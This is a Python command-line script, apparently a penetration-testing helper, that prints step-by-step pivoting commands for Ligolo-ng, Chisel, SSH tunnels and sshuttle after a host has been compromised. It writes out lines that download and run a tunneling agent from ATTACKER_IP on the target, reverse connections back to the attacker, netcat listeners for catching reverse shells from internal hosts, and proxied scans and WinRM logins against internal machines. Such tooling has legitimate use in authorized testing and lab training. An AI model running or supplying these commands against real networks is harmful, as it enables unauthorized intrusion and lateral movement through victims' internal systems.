#!/usr/bin/env python3
"""
Pivot Plumber — pivot setup without the fumbling.

Generates exact commands for attacker + target sides across
Ligolo-ng, Chisel, SSH tunnels, and sshuttle. Prints the correct
listener IPs for internal callbacks so you stop catching shells
on the wrong interface.

No dependencies beyond Python 3.6+ stdlib.
"""

import argparse
import os
import socket
import sys
import textwrap

# ───────────────── ANSI helpers ───────────────────────────

def _has_color():
    return hasattr(sys.stdout, "isatty") and sys.stdout.isatty()

_C = _has_color()

def _a(code, t): return f"\033[{code}m{t}\033[0m" if _C else t
def red(t):     return _a("91", t)
def green(t):   return _a("92", t)
def yellow(t):  return _a("93", t)
def blue(t):    return _a("94", t)
def magenta(t): return _a("95", t)
def cyan(t):    return _a("96", t)
def bold(t):    return _a("1", t)
def dim(t):     return _a("2", t)

BANNER = (
    f"\n{bold(cyan('═══════════════════════════════════════'))}\n"
    f"  {bold('PIVOT')}\n"
    f"{bold(cyan('═══════════════════════════════════════'))}\n"
    f"  {dim('Right tunnel. Right interface. Every time.')}\n"
)

# ───────────────── IP detection ───────────────────────────

def detect_interfaces():
    """Detect available network interfaces and their IPs."""
    interfaces = {}
    try:
        import fcntl
        import struct
        import array

        # Get list of interfaces
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        max_ifaces = 128
        buf = array.array('B', b'\0' * max_ifaces * 40)
        try:
            result = fcntl.ioctl(s.fileno(), 0x8912,  # SIOCGIFCONF
                                struct.pack('iL', max_ifaces * 40, buf.buffer_info()[0]))
        except Exception:
            s.close()
            return interfaces

        size = struct.unpack('iL', result)[0]
        data = buf.tobytes()[:size]
        s.close()

        offset = 0
        while offset < size:
            name = data[offset:offset+16].split(b'\0', 1)[0].decode()
            ip = socket.inet_ntoa(data[offset+20:offset+24])
            if name and ip and not ip.startswith("127."):
                interfaces[name] = ip
            offset += 40

    except Exception:
        pass

    # Fallback: try common interface names
    if not interfaces:
        for iface in ["tun0", "eth0", "wlan0", "ens33", "ens160"]:
            try:
                import fcntl
                import struct
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                ip = socket.inet_ntoa(fcntl.ioctl(
                    s.fileno(), 0x8915,
                    struct.pack("256s", iface.encode()[:15])
                )[20:24])
                if ip and not ip.startswith("127."):
                    interfaces[iface] = ip
            except Exception:
                continue

    return interfaces


def show_interfaces():
    """Print detected interfaces."""
    ifaces = detect_interfaces()
    if ifaces:
        print(f"\n  {bold('Detected interfaces:')}")
        for name, ip in ifaces.items():
            label = ""
            if name == "tun0":
                label = dim(" (VPN — use for target callbacks)")
            elif name.startswith("eth") or name.startswith("ens"):
                label = dim(" (LAN)")
            print(f"    {green(name):<12} {bold(ip)}{label}")
    else:
        print(f"\n  {dim('Could not auto-detect interfaces — specify with --attacker-ip')}")
    return ifaces


# ═══════════════════════════════════════════════════════════
#                    LIGOLO-NG
# ═══════════════════════════════════════════════════════════

def ligolo_setup(args):
    """Generate Ligolo-ng pivot setup commands."""
    attacker = args.attacker_ip or "ATTACKER_IP"
    pivot_host = args.pivot_ip or "PIVOT_IP"
    internal_net = args.internal_net or "172.16.0.0/24"
    listen_port = args.listen_port or 11601
    tun_name = args.tun_name or "ligolo"

    print(f"\n  {bold(cyan('═══ Ligolo-ng Pivot Setup ═══'))}")
    print(f"  {dim(f'Attacker: {attacker}  |  Pivot: {pivot_host}  |  Internal: {internal_net}')}\n")

    # Step 1: TUN interface
    print(f"  {bold(yellow('Step 1:'))} Create TUN interface {bold('(attacker — run once)')}")
    print(f"""
    {cyan(f'sudo ip tuntap add user $(whoami) mode tun {tun_name}')}
    {cyan(f'sudo ip link set {tun_name} up')}
""")

    # Step 2: Add route
    print(f"  {bold(yellow('Step 2:'))} Add route for internal network {bold('(attacker)')}")
    print(f"""
    {cyan(f'sudo ip route add {internal_net} dev {tun_name}')}
""")

    # Step 3: Start proxy
    print(f"  {bold(yellow('Step 3:'))} Start Ligolo proxy {bold('(attacker)')}")
    print(f"""
    {cyan(f'./proxy -selfcert -laddr 0.0.0.0:{listen_port}')}
""")

    # Step 4: Transfer + run agent
    print(f"  {bold(yellow('Step 4:'))} Transfer agent to pivot host {bold('(target)')}")
    print(f"""
    {dim('# On attacker — serve the agent:')}
    {cyan(f'python3 -m http.server 8000')}

    {dim('# On pivot host — download + run:')}
    {dim('# Linux:')}
    {cyan(f'wget http://{attacker}:8000/agent -O /tmp/agent && chmod +x /tmp/agent')}
    {cyan(f'/tmp/agent -connect {attacker}:{listen_port} -ignore-cert')}

    {dim('# Windows:')}
    {cyan(f"Invoke-WebRequest -Uri http://{attacker}:8000/agent.exe -OutFile C:\\Windows\\Temp\\agent.exe")}
    {cyan(f'C:\\Windows\\Temp\\agent.exe -connect {attacker}:{listen_port} -ignore-cert')}
""")

    # Step 5: Start tunnel
    print(f"  {bold(yellow('Step 5:'))} Select session + start tunnel {bold('(attacker — in proxy console)')}")
    print(f"""
    {cyan('session')}
    {dim('# Select the session number')}
    {cyan('start')}
""")

    # Step 6: Verify
    print(f"  {bold(yellow('Step 6:'))} Verify connectivity {bold('(attacker)')}")
    internal_example = internal_net.rsplit(".", 1)[0] + ".1"
    print(f"""
    {cyan(f'ping -c 1 {internal_example}')}
    {cyan(f'nmap -sn {internal_net}')}
""")

    # Listener guidance
    print(f"  {bold(red('═══ CALLBACK GUIDANCE ═══'))}")
    print(f"""
  {bold('When catching reverse shells from internal hosts:')}

    {red('✗ WRONG:')} Listener on {attacker} (tun0/VPN) — internal hosts {bold('cannot')} route here
    {green('✓ RIGHT:')} Listener on {bold(pivot_host)} — internal hosts CAN reach the pivot

    {dim('On the pivot host:')}
    {cyan(f'nc -lvnp 4444')}

    {dim('Reverse shell target IP should be:')}
    {green(f'{pivot_host}:4444')}    {dim('← NOT ' + attacker)}
""")

    # Double pivot
    if args.double:
        second_net = args.double_net or "10.10.0.0/24"
        print(f"\n  {bold(magenta('═══ DOUBLE PIVOT ═══'))}")
        print(f"  {dim(f'Second internal network: {second_net}')}")
        print(f"""
  {dim('Add another route on attacker:')}
    {cyan(f'sudo ip route add {second_net} dev {tun_name}')}

  {dim('Transfer + run agent on the second pivot host:')}
    {dim('(Download agent FROM the first pivot, not from attacker)')}
    {cyan(f'wget http://{pivot_host}:8000/agent -O /tmp/agent && chmod +x /tmp/agent')}
    {cyan(f'/tmp/agent -connect {attacker}:{listen_port} -ignore-cert')}

  {dim('In proxy console — add the second session + listener:')}
    {cyan('session')}
    {dim('# Select the NEW session')}
    {cyan(f'listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp')}
    {cyan('start')}
""")


# ═══════════════════════════════════════════════════════════
#                      CHISEL
# ═══════════════════════════════════════════════════════════

def chisel_setup(args):
    """Generate Chisel tunnel setup commands."""
    attacker = args.attacker_ip or "ATTACKER_IP"
    pivot_host = args.pivot_ip or "PIVOT_IP"
    internal_net = args.internal_net or "172.16.0.0/24"
    listen_port = args.listen_port or 8001
    socks_port = args.socks_port or 1080

    print(f"\n  {bold(cyan('═══ Chisel Pivot Setup ═══'))}")
    print(f"  {dim(f'Attacker: {attacker}  |  Pivot: {pivot_host}')}\n")

    # SOCKS proxy
    print(f"  {bold(yellow('Option A:'))} SOCKS proxy {bold('(most versatile)')}")
    print(f"""
    {dim('# Attacker — start chisel server:')}
    {cyan(f'./chisel server -p {listen_port} --reverse')}

    {dim('# Pivot host — connect back with SOCKS:')}
    {dim('# Linux:')}
    {cyan(f'./chisel client {attacker}:{listen_port} R:socks')}
    {dim('# Windows:')}
    {cyan(f'.\\chisel.exe client {attacker}:{listen_port} R:socks')}

    {dim('# Now use proxychains on attacker (SOCKS5 on 127.0.0.1:1080):')}
    {dim('# Edit /etc/proxychains4.conf → socks5 127.0.0.1 1080')}
    {cyan(f'proxychains4 nmap -sT -Pn {internal_net}')}
    {cyan(f'proxychains4 evil-winrm -i INTERNAL_TARGET -u user -p pass')}
""")

    # Port forward
    print(f"  {bold(yellow('Option B:'))} Specific port forward")
    print(f"""
    {dim('# Forward internal_host:445 to attacker localhost:445:')}

    {dim('# Attacker:')}
    {cyan(f'./chisel server -p {listen_port} --reverse')}

    {dim('# Pivot host:')}
    {cyan(f'./chisel client {attacker}:{listen_port} R:445:INTERNAL_TARGET:445')}

    {dim('# Now on attacker:')}
    {cyan('smbclient -L //127.0.0.1/ -U user')}
""")

    # Transfer
    print(f"  {bold(yellow('Transfer:'))}")
    print(f"""
    {dim('# Serve from attacker:')}
    {cyan('python3 -m http.server 8000')}

    {dim('# Linux target:')}
    {cyan(f'wget http://{attacker}:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel')}

    {dim('# Windows target:')}
    {cyan(f"Invoke-WebRequest -Uri http://{attacker}:8000/chisel.exe -OutFile C:\\Windows\\Temp\\chisel.exe")}
""")

    # Callback note
    print(f"  {bold(red('═══ CALLBACK GUIDANCE ═══'))}")
    print(f"""
  {bold('With SOCKS proxy, reverse shells from internal hosts:')}

    {dim('Option 1: Catch on the pivot host')}
    {cyan(f'# On pivot: nc -lvnp 4444')}
    {cyan(f'# Payload targets: {pivot_host}:4444')}

    {dim('Option 2: Port forward the listener')}
    {cyan(f'# Pivot: ./chisel client {attacker}:{listen_port} R:4444:{attacker}:4444')}
    {cyan(f'# Attacker: nc -lvnp 4444')}
    {cyan(f'# Payload targets: {pivot_host}:4444  (forwarded to attacker)')}
""")


# ═══════════════════════════════════════════════════════════
#                   SSH TUNNELS
# ═══════════════════════════════════════════════════════════

def ssh_setup(args):
    """Generate SSH tunnel commands."""
    attacker = args.attacker_ip or "ATTACKER_IP"
    pivot_host = args.pivot_ip or "PIVOT_IP"
    pivot_user = args.pivot_user or "user"
    socks_port = args.socks_port or 1080

    print(f"\n  {bold(cyan('═══ SSH Tunnel Setup ═══'))}")
    print(f"  {dim(f'Attacker: {attacker}  |  Pivot: {pivot_user}@{pivot_host}')}\n")

    # Dynamic SOCKS
    print(f"  {bold(yellow('Option A:'))} Dynamic SOCKS proxy {bold('(most versatile)')}")
    print(f"""
    {dim('# From attacker — creates SOCKS proxy on localhost:' + str(socks_port) + ':')}
    {cyan(f'ssh -D {socks_port} -N -f {pivot_user}@{pivot_host}')}

    {dim('# Use with proxychains:')}
    {dim(f'# Edit /etc/proxychains4.conf → socks5 127.0.0.1 {socks_port}')}
    {cyan('proxychains4 nmap -sT -Pn INTERNAL_TARGET')}
    {cyan('proxychains4 evil-winrm -i INTERNAL_TARGET -u user -p pass')}
""")

    # Local port forward
    print(f"  {bold(yellow('Option B:'))} Local port forward {bold('(specific service)')}")
    print(f"""
    {dim('# Forward INTERNAL_TARGET:445 to attacker localhost:445:')}
    {cyan(f'ssh -L 445:INTERNAL_TARGET:445 -N -f {pivot_user}@{pivot_host}')}

    {dim('# Forward multiple ports:')}
    {cyan(f'ssh -L 80:INTERNAL_TARGET:80 -L 445:INTERNAL_TARGET:445 -L 3389:INTERNAL_TARGET:3389 -N -f {pivot_user}@{pivot_host}')}

    {dim('# Now access on attacker:')}
    {cyan('smbclient -L //127.0.0.1/ -U user')}
    {cyan('xfreerdp /v:127.0.0.1 /u:user /p:pass')}
""")

    # Remote port forward
    print(f"  {bold(yellow('Option C:'))} Remote port forward {bold('(pivot catches → attacker receives)')}")
    print(f"""
    {dim('# From pivot host — forward pivot:4444 back to attacker:4444:')}
    {cyan(f'ssh -R 4444:127.0.0.1:4444 -N -f {pivot_user}@{attacker}')}

    {dim('# Attacker starts listener:')}
    {cyan('nc -lvnp 4444')}

    {dim('# Reverse shell on internal host targets:')}
    {green(f'{pivot_host}:4444')}    {dim('→ tunneled back to attacker')}
""")

    # SSH key-based
    print(f"  {bold(yellow('With SSH key:'))}")
    print(f"""
    {cyan(f'ssh -i id_rsa -D {socks_port} -N -f {pivot_user}@{pivot_host}')}
    {cyan(f'ssh -i id_rsa -L 445:INTERNAL_TARGET:445 -N -f {pivot_user}@{pivot_host}')}
""")


# ═══════════════════════════════════════════════════════════
#                    SSHUTTLE
# ═══════════════════════════════════════════════════════════

def sshuttle_setup(args):
    """Generate sshuttle commands."""
    pivot_host = args.pivot_ip or "PIVOT_IP"
    pivot_user = args.pivot_user or "user"
    internal_net = args.internal_net or "172.16.0.0/24"

    print(f"\n  {bold(cyan('═══ sshuttle Setup ═══'))}")
    print(f"  {dim(f'Pivot: {pivot_user}@{pivot_host}  |  Internal: {internal_net}')}\n")

    print(f"  {bold(yellow('Basic:'))}")
    print(f"""
    {dim('# Route internal network through the pivot (needs SSH creds/key):')}
    {cyan(f'sshuttle -r {pivot_user}@{pivot_host} {internal_net}')}

    {dim('# With SSH key:')}
    {cyan(f'sshuttle -e "ssh -i id_rsa" -r {pivot_user}@{pivot_host} {internal_net}')}

    {dim('# Multiple subnets:')}
    {cyan(f'sshuttle -r {pivot_user}@{pivot_host} {internal_net} 10.10.0.0/24')}

    {dim('# Exclude the pivot host itself (prevents lockout):')}
    {cyan(f'sshuttle -r {pivot_user}@{pivot_host} {internal_net} -x {pivot_host}')}
""")

    print(f"  {bold(green('Advantage:'))} No proxychains needed — all TCP traffic is transparently routed.")
    print(f"  {bold(red('Limitation:'))} TCP only (no UDP/ICMP), needs SSH access to pivot.\n")


# ═══════════════════════════════════════════════════════════
#                   CHEATSHEET
# ═══════════════════════════════════════════════════════════

def cheatsheet(args):
    """Print the full pivot reference."""
    ligolo_setup(args)
    chisel_setup(args)
    ssh_setup(args)
    sshuttle_setup(args)

    # Quick comparison
    print(f"\n  {bold(cyan('═══ When To Use What ═══'))}\n")
    print(f"    {bold('Ligolo-ng')}     Full tunnel, works like a VPN. Best for nmap/full enum.")
    print(f"                  Needs: agent binary on target, TUN interface on attacker.")
    print(f"                  {green('✓')} Full TCP/UDP/ICMP  {green('✓')} No proxychains  {red('✗')} Binary transfer required\n")
    print(f"    {bold('Chisel')}        SOCKS proxy or port forwards. Solid all-rounder.")
    print(f"                  Needs: chisel binary on target.")
    print(f"                  {green('✓')} Easy setup  {green('✓')} Reverse connections  {yellow('~')} Proxychains for SOCKS\n")
    print(f"    {bold('SSH')}           Built-in, no transfers needed. Best when you have SSH creds.")
    print(f"                  {green('✓')} No binary transfer  {green('✓')} Already there  {yellow('~')} Proxychains for SOCKS\n")
    print(f"    {bold('sshuttle')}      Transparent TCP proxy. Simplest if you have SSH access.")
    print(f"                  {green('✓')} No proxychains  {green('✓')} Zero config on target  {red('✗')} TCP only\n")

    # Common gotchas
    print(f"  {bold(red('═══ Common Gotchas ═══'))}\n")
    print(f"    {red('1.')} Reverse shell listeners must be on the {bold('pivot host')}, not your VPN IP.")
    print(f"       Internal hosts cannot route to tun0 — they can only reach the pivot.\n")
    print(f"    {red('2.')} When using proxychains, use {bold('-sT')} (connect scan) with nmap, not -sS.")
    print(f"       SYN scans don't work through SOCKS proxies.\n")
    print(f"    {red('3.')} If Ligolo tunnel dies, the TUN interface and routes persist.")
    print(f"       Delete with: {cyan('sudo ip link del ligolo')}\n")
    print(f"    {red('4.')} Double-check proxychains config — {bold('socks5')} not socks4.")
    print(f"       File: {dim('/etc/proxychains4.conf')}\n")
    print(f"    {red('5.')} If a port forward collides, check for stale tunnels:")
    print(f"       {cyan('ss -tlnp | grep <port>')}\n")


# ═══════════════════════════════════════════════════════════
#                        CLI
# ═══════════════════════════════════════════════════════════

def parse_args():
    p = argparse.ArgumentParser(
        description="Pivot Plumber — right tunnel, right interface, every time",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              pivot ligolo --attacker-ip 10.10.15.110 --pivot-ip 172.16.139.10 --internal-net 172.16.139.0/24
              pivot chisel --attacker-ip 10.10.15.110 --pivot-ip 10.10.10.5
              pivot ssh --pivot-ip 10.10.10.5 --pivot-user developer
              pivot sshuttle --pivot-ip 10.10.10.5 --pivot-user admin --internal-net 10.0.0.0/24
              pivot cheatsheet --attacker-ip 10.10.15.110 --pivot-ip 172.16.139.10
              pivot interfaces
        """),
    )

    sub = p.add_subparsers(dest="mode", help="Pivot method")

    # Shared arg helper
    def add_shared(sp):
        sp.add_argument("--attacker-ip", "-a", help="Your attacker IP (tun0/VPN)")
        sp.add_argument("--pivot-ip", "-p", help="Pivot host IP (the box you've owned)")
        sp.add_argument("--internal-net", "-n", help="Internal network to reach (e.g. 172.16.0.0/24)")
        sp.add_argument("--pivot-user", "-u", help="SSH username on pivot (for SSH/sshuttle)")
        sp.add_argument("--listen-port", type=int, help="Listener port (default varies by tool)")
        sp.add_argument("--socks-port", type=int, default=1080, help="SOCKS proxy port (default: 1080)")
        sp.add_argument("--tun-name", default="ligolo", help="TUN interface name (default: ligolo)")
        sp.add_argument("--double", action="store_true", help="Include double-pivot guidance")
        sp.add_argument("--double-net", help="Second internal network for double pivot")

    lg = sub.add_parser("ligolo", help="Ligolo-ng tunnel setup")
    add_shared(lg)

    ch = sub.add_parser("chisel", help="Chisel SOCKS/port forward setup")
    add_shared(ch)

    ss = sub.add_parser("ssh", help="SSH tunnel setup")
    add_shared(ss)

    st = sub.add_parser("sshuttle", help="sshuttle transparent proxy setup")
    add_shared(st)

    cs = sub.add_parser("cheatsheet", help="Full pivot reference + comparison")
    add_shared(cs)

    sub.add_parser("interfaces", help="Show detected network interfaces")

    return p.parse_args()


def main():
    args = parse_args()
    print(BANNER)

    if not args.mode:
        print(f"  Usage: python3 pivot.py {{ligolo,chisel,ssh,sshuttle,cheatsheet,interfaces}} [options]")
        print(f"\n  {bold('Quick start:')}")
        print(f"    {cyan('python3 pivot.py ligolo')} {dim('-a 10.10.15.110 -p 172.16.139.10 -n 172.16.139.0/24')}")
        print(f"    {cyan('python3 pivot.py chisel')} {dim('-a 10.10.15.110 -p 10.10.10.5')}")
        print(f"    {cyan('python3 pivot.py cheatsheet')}")
        print(f"    {cyan('python3 pivot.py interfaces')}\n")
        sys.exit(0)

    if args.mode == "interfaces":
        show_interfaces()
        print()
        return

    if args.mode == "ligolo":
        ligolo_setup(args)
    elif args.mode == "chisel":
        chisel_setup(args)
    elif args.mode == "ssh":
        ssh_setup(args)
    elif args.mode == "sshuttle":
        sshuttle_setup(args)
    elif args.mode == "cheatsheet":
        cheatsheet(args)


if __name__ == "__main__":
    main()
